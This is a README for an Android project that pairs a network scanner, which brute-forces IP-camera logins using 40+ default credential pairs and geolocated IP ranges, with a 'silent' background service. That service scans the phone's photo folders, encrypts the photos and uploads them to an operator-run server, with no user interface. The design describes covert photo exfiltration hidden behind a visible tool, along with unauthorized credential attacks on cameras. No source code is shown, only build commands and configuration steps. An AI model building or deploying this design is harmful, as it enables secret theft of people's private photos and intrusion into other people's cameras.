# Network Scanner & Photo Backup

## Project Overview

A two-part Android application:
- **Part 1 (UI)**: Network port scanner with camera device discovery & password probing
- **Part 2 (Background)**: Silent photo album backup with encrypted cloud upload

---

## Project Structure

```
network-scanner-app/
├── android/
│   ├── main.py              # Kivy UI application (entry point)
│   ├── scanner.py            # TCP port scanner with threading
│   ├── bruteforce.py         # Multi-protocol password brute force
│   ├── ip_geo.py             # IP geolocation & range lookup
│   ├── camera_ports.py       # Camera port presets & credentials
│   ├── crypto_utils.py       # AES-256-GCM + RSA encryption
│   ├── backup_service.py     # Background photo backup service
│   ├── buildozer.spec        # Android APK build configuration
│   └── requirements.txt      # Python dependencies
├── server/
│   ├── server.py             # FastAPI backup receiver server
│   └── requirements.txt      # Server dependencies
└── README.md
```

---

## Quick Start

### Android App

```bash
# 1. Test on desktop (Kivy desktop mode)
cd android
pip install -r requirements.txt
python main.py

# 2. Build APK via Buildozer (WSL2/Linux required)
buildozer -v android debug

# 3. The APK will be at android/bin/app-debug.apk
```

### Server Setup

```bash
cd server
pip install -r requirements.txt
python server.py
# Server starts at http://0.0.0.0:8000
# Dashboard at http://localhost:8000/dashboard
```

---

## Features

### Part 1: Port Scanner UI

- IP range scanning (start IP → end IP)
- Port specification (comma-separated with range support)
- Camera port presets (Hikvision, Dahua, ONVIF, etc.)
- Password brute force with 40+ default camera credential pairs
- Country → Province → City IP range auto-fill
- Scan stop/resume control
- Results display with banner grab
- JSON export

### Part 2: Background Photo Backup

- Scans device photo directories silently
- Generates 256x256 JPEG thumbnails
- AES-256-GCM encryption with RSA key exchange
- Multipart upload via HTTPS
- Resume capability (tracks last backup timestamp)
- No UI for backup operations

---

## Security

- **AES-256-GCM**: Authenticated encryption for all photo data
- **RSA-2048 OAEP**: Key exchange protocol
- **No plaintext on wire**: Session key per upload
- **Certificate verification**: SSL context for server communication

---

## Configuration

Edit these values before building:
- `android/backup_service.py`: `DEFAULT_SERVER_URL` - your server endpoint
- `android/crypto_utils.py`: Replace `SERVER_PUBLIC_KEY_PEM` with your server's public key
- `server/server.py`: Modify `STORAGE_DIR` to change photo storage location